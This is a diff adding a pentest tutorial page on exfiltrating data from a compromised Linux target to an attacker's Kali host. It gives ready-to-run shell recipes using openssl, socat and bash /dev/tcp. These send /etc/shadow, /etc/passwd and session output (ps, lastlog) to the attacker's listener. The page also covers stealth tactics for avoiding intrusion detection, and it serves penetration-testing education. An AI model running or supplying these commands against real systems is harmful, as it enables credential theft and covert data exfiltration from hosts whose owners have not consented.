@@ -1,0 +1,396 @@
+.. include:: /pentest_links.txt
+
+
+************
+Exfiltration
+************
+
+Exfiltration's goal is to silently, securely transfer data from a target host to an attacker host. Securely usually means encrypted; silently means leaving little unusual network traffic footprint or target host artifacts for network and host intrusion detection systems. Of course being secure and silent depends on the target's defenses. A target network with no network traffic monitoring or host intrusion detection makes even FTP silent and secure; but having host intrusion detection along with logging all network traffic (forcing encryption through a logging encryption endpoint) raises the bar considerably.
+
+
+Silently
+========
+
+Being silent
+------------
+
+* Normal traffic only
+
+  This depends on the target network defenses and can mean: no unusual protocols (IPv6 on an IPv4-only network), no unusual ports (port 4444 could raise flags), and/or no tunneling of protocol X inside protocol Y (using port 443 for SSH traffic).
+
+* Encryption
+
+  Here this can mean network traffic encryption or some form of public key or symmetric encryption. Here is an example of symmetric encryption based on a password:
+
+  .. code-block:: bash
+
+    ORIG=orig
+    ENCRYPTED=encrypted
+    DECRYPTED=decrypted
+    PWFILE=pass
+    # Make sure password not in history file
+    read PASS
+    mysecretpassword
+    echo $PASS > $PWFILE
+    # encrypt the file
+    echo hello > $ORIG
+    openssl aes-256-cbc -a -salt -in "$ORIG" -out "$ENCRYPTED" -pass file:$PWFILE
+    # decrypt the file
+    openssl aes-256-cbc -d -a -salt -in "$ENCRYPTED" -out "$DECRYPTED" -pass file:$PWFILE
+    rm -f $PWFILE
+    # check $ORIG = $DECRYPTED
+    diff $ORIG $DECRYPTED
+
+* Stenography
+
+  This can mean hiding data using programs like :program:`steghide`.
+
+* No target software "installs", but file copy OK
+
+  By "install" we mean using package management that leaves target host footprints not easily removed. It is acceptable to copy files to the target host that can easily be removed without leaving a footprint.
+
+Target software expectations
+----------------------------
+
+Typically Linux targets have the following software installed: :program:`ftp` (often) but not a TFTP client; :program:`openssl`; :program:`python` and :program:`perl`; :program:`ssh` and :program:`scp`; one of :program:`wget` or :program:`curl` (though not always).
+
+Shell without tty/pty
+---------------------
+
+The initial remote shell often lacks a tty/pty and so workarounds are required when running programs requiring user input (like a password). For possible workarounds see `Post-Exploitation Without A TTY <http://pentestmonkey.net/blog/post-exploitation-without-a-tty>`_ and `Reverse Shell Cheat Sheet <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>`_.
+
+.. _bootstrapping-exfiltration:
+
+Bootstrapping exfiltration
+==========================
+
+Here are more primitive techiniques that can transfer files using existing software without elaborate setup.
+
+Generating keys and certs
+-------------------------
+
+Bootstrap techniques can require client & server keys & certs to enable encryption and client/server authentication.
+
+.. code-block:: bash
+
+  # Generate target and kali self signed certificate.
+  # In pentests the cert CN might have to be an IP
+  for H in target,192.168.1.102 kali,192.168.1.104; do
+    N=${H%,*}
+    IP=${H#*,}
+    openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
+      -keyout $N.key -out $N.crt \
+      -subj /C=US/ST=California/L=Redondo\ Beach/O=South\ Bay\ Pentest\ Meetup/OU=pentest/CN=$IP
+    cat $N.key $N.crt > $N.pem
+    chmod 600 $N.key $N.pem
+  done
+  # Get dhparam for older systems defaulting to insecure dh negotiation.
+  #   Newer systems will reject insecure dh negotiation.
+  openssl dhparam -outform PEM -out dhparam.pem 2048
+  # Alternatively could download one
+  #   curl --output dhparam.pem https://bettercrypto.org/static/dhparams/group14.pem
+
+Transferring multiple files
+---------------------------
+
+Multiple files can be reduced to the problem of transferring one file by using :program:`tar` or :program:`zip` (which offers the side benefit of encryption).
+
+:program:`socat` vs :program:`openssl`
+--------------------------------------
+
+Below we'll show how to use both :program:`socat` and :program:`openssl` to transfer files. Which is best to use? First, each tool does some unique things: :program:`openssl` can create your PKI & encrypt files, while :program:`socat` is a master at manipulating sockets. But :program:`socat`'s big weakness is its lack of ubiquity. When :program:`socat` is available on both server and client, or you don't need encryption, it's easier to use. But when the client doesn't have :program:`socat` and you need encryption, then you have to use :program:`openssl` anyway and it will be easier to use just :program:`openssl`.
+
+:program:`openssl s_server` to :program:`openssl s_client`
+----------------------------------------------------------
+
+:program:`openssl` is not a one-trick pony: besides generating PKI files, it can send/receive encrypted traffic and provide a simple HTTPS server. Plus it's usually available on Linux hosts.
+
+Transfer files using openssl HTTPS server with curl client
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Here we demonstrated serving files over HTTPS starting with kali as the openssl HTTPS server. Since the target doesn't have its newly-generated certs it will download them from kali.
+
+.. code-block:: bash
+
+  # On $KALI serve files in directory
+  TARGET=192.168.1.102
+  PORT=4443
+  KALI=192.168.1.104
+  # HTTPS server shouldn't check client cert as client doesn't have one now.
+  openssl s_server -WWW -dhparam dhparam.pem -key kali.key -cert kali.crt -accept $PORT
+
+  # On $TARGET fetch needed certs (may need "--insecure" option on modern curl)
+  TARGET=192.168.1.102
+  PORT=4443
+  KALI=192.168.1.104
+  INSECURE=
+  # Some older clients do not support --insecure 
+  INSECURE="--insecure"
+  [[ $(curl --insecure  2>&1 | grep -c -- '--insecure') -ne 0  ]] && INSECURE=
+  curl --silent $INSECURE --remote-name https://$KALI:$PORT/target.key
+  curl --silent $INSECURE --remote-name https://$KALI:$PORT/target.crt
+  curl --silent $INSECURE --remote-name https://$KALI:$PORT/target.pem
+  curl --silent $INSECURE --remote-name https://$KALI:$PORT/kali.crt
+  curl --silent $INSECURE --remote-name https://$KALI:$PORT/dhparam.pem
+  chmod 600 target.key target.pem
+
+  # On $KALI control-C to kill web server
+
+Next the target runs HTTPS to fetch some files.
+
+.. code-block:: bash
+
+  # On $TARGET start openssl HTTPS server (older servers need -dhparam)
+  #   Newer servers can use -verify_return_error to actually verify the client.
+  #   Older servers cannot force client cert verification.
+  VERIFY="-verify_return_error"
+  [[ $(openssl s_server -verify_return_error  2>&1 | \
+       grep -c -- 'unknown option -verify_return_error') -ne 0  ]] && VERIFY=
+  openssl s_server -WWW -dhparam dhparam.pem -cert target.pem \
+    -Verify 1 -CAfile kali.crt $VERIFY -accept $PORT
+  # Get shadow file into web server directory prior to client request
+  cp /etc/shadow $PWD
+
+  # On $KALI fetch file
+  FILENAME=shadow
+  curl --silent --cacert target.pem --output $FILENAME --cert kali.pem https://$TARGET:$PORT/$FILENAME
+
+  # On $TARGET control-C to kill web server (may leave port locked by process)
+
+So you can simply run openssl HTTPS web servers on both hosts to transfer files.
+
+openssl file transfer without HTTPS
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Here we use ``openssl s_server`` and ``openssl s_client`` to send/receive files.
+
+.. code-block:: bash
+
+  # To transfer 1 file from $TARGET to $KALI with mutual authentication
+  # On $TARGET (newer clients can use -verify_return_error)
+  TARGET=192.168.1.102
+  PORT=4443
+  KALI=192.168.1.104
+  # Check for old openssl version that cannot use -verify_return_error.
+  VERIFY="-verify_return_error"
+  [[ $(openssl s_server -verify_return_error  2>&1 | \
+       grep -c -- 'unknown option -verify_return_error') -ne 0  ]] && VERIFY=
+  openssl s_server -dhparam dhparam.pem -cert target.pem \
+    -Verify 1 -CAfile kali.crt $VERIFY -accept $PORT < /etc/shadow
+
+  # On $KALI
+  TARGET=192.168.1.102
+  PORT=4443
+  KALI=192.168.1.104
+  openssl s_client -connect $TARGET:$PORT -cert kali.pem \
+    -verify 1 -verify_return_error -CAfile target.crt -quiet > etc_shadow
+
+:program:`socat` on kali
+------------------------
+
+Take advantage :program:`socat` (or :program:`nc`, :program:`ncat`, :program:`netcat`) to transfer data over the network. For unencrypted traffic the target host uses :program:`bash`'s /dev/tcp/IP/PORT but for encrypted traffic the client can use :program:`socat` (when available) or ``openssl s_client``.
+
+Why bother with :program:`socat` when :program:`openssl` seems to do everything? It's much easier to send unencrypted target terminal command session output using :program:`socat`.
+
+Transferring 1 file to/from target
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Here we just require that the target host has bash with /dev/tcp enabled and Kali has :program:`socat`. Note that for all transfers (regardless of direction) you start :program:`socat` using TCP-LISTEN on Kali first, then send/receive from the target host.
+
+target ==> Kali
+"""""""""""""""
+
+To transfer :file:`/etc/passwd` first set up the Kali listener:
+
+.. code-block:: bash
+
+  # On $KALI
+  PORT=4444
+  FILENAME=etc_passwd
+  socat -u TCP-LISTEN:$PORT OPEN:$FILENAME,creat
+
+  # On $TARGET
+  KALI=192.168.1.104
+  PORT=4444
+  FILENAME=/etc/passwd
+  cat $FILENAME > /dev/tcp/$KALI/$PORT
+
+For an encrypted transfer switch to ``socat -u OPENSSL-LISTEN...`` being fed by ``openssl s_client ...`` (since this particular target did not have :program:`socat`):
+
+.. code-block:: bash
+
+  # On $KALI
+  PORT=4443
+  FILENAME=etc_passwd
+  socat -u OPENSSL-LISTEN:$PORT,cert=kali.pem,cafile=target.crt OPEN:$FILENAME,creat
+
+  # On $TARGET
+  KALI=192.168.1.104
+  PORT=4443
+  FILENAME=/etc/passwd
+  VERIFY="-verify_return_error"
+  [[ $(openssl s_client -verify_return_error  2>&1 | \
+       grep -c -- 'unknown option -verify_return_error') -ne 0  ]] && VERIFY=
+  openssl s_client -connect $KALI:$PORT -cert target.pem \
+    -verify 1 -CAfile kali.crt $VERIFY < $FILENAME
+
+Kali ==> target
+"""""""""""""""
+
+To transfer a file from Kali to the target first start on Kali:
+
+.. code-block:: bash
+
+  # On $KALI
+  PORT=4444
+  FILENAME=sshd_config
+  socat -u OPEN:$FILENAME TCP-LISTEN:$PORT
+
+  # On $TARGET
+  KALI=192.168.1.104
+  PORT=4444
+  FILENAME=sshd_config
+  cat < /dev/tcp/$KALI/$PORT > $FILENAME
+
+For an encrypted transfer switch to ``socat -u ... OPENSSL-LISTEN...`` being fed by ``openssl s_client ...``:
+
+.. code-block:: bash
+
+  # On $KALI
+  PORT=4444
+  FILENAME=sshd_config
+  socat -u OPEN:$FILENAME OPENSSL-LISTEN:$PORT,cert=kali.pem,cafile=target.crt
+
+  # On $TARGET
+  KALI=192.168.1.104
+  PORT=4443
+  FILENAME=sshd_config
+  VERIFY="-verify_return_error"
+  [[ $(openssl s_client -verify_return_error  2>&1 | \
+       grep -c -- 'unknown option -verify_return_error') -ne 0  ]] && VERIFY=
+  openssl s_client -connect $KALI:$PORT -cert target.pem \
+    -verify 1 -CAfile kali.crt $VERIFY -quiet > $FILENAME
+
+Transferring multiple files and command output from target
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Multiple files can be :program:`tar`'ed or :program:`zip`'ed into a single archive file that can be transferred as above.
+
+Capturing target terminal command sessions to Kali
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+However, there are times you want to capture terminal session output. You can do that 2 ways: (1) send command output to a file (``command 1>>logfile 2>&1``) and transfer the 1 file :file:`logfile`; (2) send command output to /dev/tcp/HOST/PORT. Here we option (2). First start the listener on Kali:
+
+.. code-block:: bash
+
+  PORT=4444
+  FILENAME="host-session_$(date +'%F_%H%M%S').txt"
+  socat -u TCP-LISTEN:$PORT,fork,reuseaddr OPEN:"$FILENAME",creat,append
+
+Then on the target host:
+
+.. code-block:: bash
+
+  KALI=192.168.1.104
+  PORT=4444
+  (
+  echo "# dump /etc/passwd"
+  cat /etc/passwd
+  echo "# dump /etc/shadow"
+  cat /etc/shadow
+  echo "# ps -ef"
+  ps -ef
+  echo "# lastlog"
+  lastlog
+  ) 1>/dev/tcp/$KALI/$PORT 2>&1
+
+You'll see all the results in a Kali file :file:`host-session_2015-06-27_114402.txt`. Binary files are most easily transferred individually or as part of a tar/zip archive.
+
+Encrypted :program:`socat` to :program:`socat` traffic
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Traffic can be encrypted following `Securing Traffic Between two Socat Instances Using SSL <http://www.dest-unreach.org/socat/doc/socat-openssltunnel.html>`_ when :program:`socat` is available on both hosts:
+
+.. code-block:: bash
+
+  # on the server (add fork option if want multiple clients)
+  socat OPENSSL-LISTEN:4433,reuseaddr,cert=server.pem,cafile=client.crt STDIO
+  # on the client
+  socat STDIO OPENSSL-CONNECT:server.domain.org:4433,cert=client.pem,cafile=server.crt
+
+
+Exfiltration via conventional services
+======================================
+
+There are conventional services meant to transfer files: TFTP, FTP, HTTP/HTTPS, ,SSH, scp, SMB, NFS, ... . We mention only a few of these below.
+
+TFTP
+----
+
+Kali currently has the :program:`atftpd` tftp server package installed by default (but not the :program:`atftp` client package). The challenge is getting a tftp client on the target host.
+
+Setup is quick:
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  CONFIG=/etc/default/atftpd
+  $SUDO cp $CONFIG $CONFIG.orig
+  cat <<EOF | $SUDO tee $CONFIG
+  USE_INETD=false
+  OPTIONS="--tftpd-timeout 300 --retry-timeout 5 --port 69 --maxthread 100 --verbose=5 /srv/tftp"
+  EOF
+  # Insure /srv/tftp exists with owner nobody.root and perms 755
+  TFTPDIR=/srv/tftp
+  ls -ld $TFTPDIR
+  $SUDO mkdir -p $TFTPDIR
+  $SUDO chown nobody.root $TFTPDIR
+  $SUDO chmod 755 $TFTPDIR
+  ls -ld $TFTPDIR
+
+If there's no readily available client for the target host one can often find a client to download. For example, if perl is available on the client, the perl module `gbarr/perl-net-tftp <https://github.com/gbarr/perl-net-tftp>`_ (Net::TFTP) can be used. Here's an example for Kali linux (assuming the tftp server is configured as above):
+
+.. code-block:: bash
+
+  mkdir -p Net
+  cd Net
+  curl --remote-name https://github.com/gbarr/perl-net-tftp/blob/master/TFTP.pm
+  cd ..
+  # Start with "hello.txt"
+  echo hello > hello.txt
+  # Put it to the tftp server as file "hi.txt"
+  perl -e 'use Net::TFTP; $tftp = Net::TFTP->new("localhost"); $tftp->binary; my $retval = $tftp->put("hello.txt", "hi.txt")'
+  # Now fetch it from the tftp server as file "hihi.txt"
+  perl -e 'use Net::TFTP; $tftp = Net::TFTP->new("localhost"); my $retval = $tftp->get("hi.txt","hihi.txt");'
+  # Show it hasn't changed:
+  diff hello.txt hihi.txt
+
+Kali does not have a client installed nor will very few target hosts. However, you can use the perl Net::TFTP module from a small perl file to download/upload files.
+
+FTP
+---
+
+`hackerkitty Install ftp server on Kali Linux <https://hackerkitty.wordpress.com/2014/10/24/install-ftp-server-on-kali-linux/>`_ and `Go Secure! Install ftp server on Kali Linux <http://www.gosecure.it/blog/art/93/note/install-ftp-server-on-kali-linux/>`_ are good references.
+
+HTTP/HTTPS
+----------
+
+Python provides a simple HTTP server for GET and HEAD requests:
+
+.. code-block:: bash
+
+  DIRECTORY=/var/www
+  PORT=8000  # the default
+  cd $DIRECTORY
+  python -m SimpleHTTPServer $PORT
+
+This can be done on both the client and server to transfer files.
+
+There are many existing articles covering HTTP setup allowing both file upload and download. We mention here that setting up a primitive HTTPS server using :program:`openssl` is covered in :ref:`bootstrapping-exfiltration` below.
+
+SSH
+---
+
+See `SSH Cheat Sheet <http://pentestmonkey.net/cheat-sheet/ssh-cheat-sheet>`_ for ideas about using :program:`ssh`.
+
